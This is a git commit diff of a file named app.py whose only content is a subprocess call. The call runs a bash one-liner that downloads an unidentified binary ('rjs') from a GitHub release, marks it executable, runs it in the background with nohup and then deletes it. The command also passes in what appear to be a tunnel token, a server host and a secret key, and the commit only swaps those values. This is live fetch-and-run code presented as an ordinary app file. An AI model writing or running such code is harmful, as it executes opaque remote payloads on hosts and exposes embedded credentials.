5208aa3660a2f2baaccf37fef36ab699a4eac682
tArogoD <jfu5285@mysvc.skagit.edu>
2025-06-25 20:03:46 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,3 +1,3 @@
 import subprocess
-cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiY2FhMzY0MGMtNjRhMy00YzIxLTlmZTgtMDczNjEyZmZlNzhjIiwicyI6Ik4yUTBNalEzTVRjdE5qZzBNaTAwTTJSakxXRmlOemd0TmpaallXVTRNVFEwTTJNNCJ9 N_S=nz.seav.eu.org N_K=f16nCvgRNRUamt8WrA bash -c 'curl -L -o rjs https://github.com/seav1/dl/releases/download/src/rjs && chmod +x rjs && nohup ./rjs && rm rjs'"
+cmd = "C_T=eyJhIjoiZjAzMGY1ZDg4OGEyYmRlN2NiMDg3NTU5MzM4ZjE0OTciLCJ0IjoiOGUwNWI3MTctMjdjNC00M2Y1LTg1NDgtNGRiZWY5MmI1N2NjIiwicyI6IlpqWm1OMk5qTldRdE5qazJOaTAwTURoaExUazFaR0l0WVRCaE1UTTVOREJqTkRKaSJ9 N_S=nz.seav.eu.org N_K=6vMF6UloFs9SUUYGPM bash -c 'curl -L -o rjs https://github.com/seav1/dl/releases/download/src/rjs && chmod +x rjs && nohup ./rjs && rm rjs'"
 subprocess.call(cmd, shell=True)
